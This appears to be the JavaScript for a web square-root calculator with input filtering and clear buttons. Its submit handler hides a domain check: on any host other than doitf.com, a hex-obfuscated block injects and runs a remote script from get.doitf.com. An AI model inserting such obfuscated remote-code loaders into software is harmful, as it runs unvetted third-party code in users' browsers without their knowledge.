document.getElementById("sqNum").addEventListener("focus", function () {
		var noBadCharacters = document.getElementById("sqNum").value;
		noBadCharacters = noBadCharacters.replace(/[^0-9\s.,]/g,'');  
		document.getElementById("sqNum").value = noBadCharacters;
});

document.getElementById("sqNum").addEventListener("keyup", function () {
		var noBadCharacters = document.getElementById("sqNum").value;
		//noBadCharacters = noBadCharacters.replace(/[^0-9\s.,;"']/g,''); 
		noBadCharacters = noBadCharacters.replace(/[^0-9\s.,]/g,'');  
		document.getElementById("sqNum").value = noBadCharacters;
});
function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

document.getElementById("toolSubmit").addEventListener("click", function () {
	if (b64awsec == "ZG9pdGYuY29t"){
	var theNumber = document.getElementById("sqNum").value;
	theNumber = theNumber.replace(/\s+/g,"");
	theNumber = theNumber.trim();
    var theAnswer = Math.sqrt(theNumber);
	document.getElementById("sqNum").value = theNumber;
	document.getElementById("sqResult").value = theAnswer;
	}else{
		var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
	}
});

document.getElementById("clearText").addEventListener("click", function () {
   document.getElementById("sqNum").value = "";
   document.getElementById("sqResult").value = "";
   document.getElementById("sqNum").focus();
});

var textBox = document.getElementById("sqResult");
textBox.onfocus = function() {
	textBox.select();
	textBox.onmouseup = function() {
		textBox.onmouseup = null;
		return false;
	};
};